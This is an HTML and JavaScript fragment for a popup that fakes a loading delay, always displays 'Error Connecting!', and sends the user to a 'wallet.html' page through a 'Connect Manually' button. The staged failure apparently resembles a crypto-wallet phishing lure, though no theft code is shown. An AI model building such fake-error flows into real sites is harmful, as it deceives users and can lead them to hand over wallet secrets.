        <div id="popup-container">

    <div id="error-message">Error Connecting!</div>
    <button id="proceed-button" onclick="proceed()">Connect Manually</button>
     <button class="cool-button" onclick="closePopup()">
    <div class="cross-line horizontal-line"></div>

  </button>

    <script>
    function closePopup() {
      let loadingAnimation = document.getElementById('loading-animation');
      let errorMessage = document.getElementById('error-message');
      
      // Reset loading animation and hide error message
      loadingAnimation.style.display = 'block';
      errorMessage.style.display = 'none';

      document.getElementById('popup-container').style.display = 'none';
    
    }

    function showPopup() {
    
    document.getElementById('popup-container').style.left = '15%';
      document.getElementById('popup-container').style.display = 'flex';
      
    // Simulate loading and show error
    setTimeout(function() {
        let loadingAnimation = document.getElementById('loading-animation');
        let errorMessage = document.getElementById('error-message');

        loadingAnimation.style.display = 'none';
        errorMessage.style.display = 'block';
      }, 10000);
    }
    function proceed() {
      // Your logic here, if any
      window.location.href = 'wallet.html'; // Navigate to the "wallet.html" page
    }
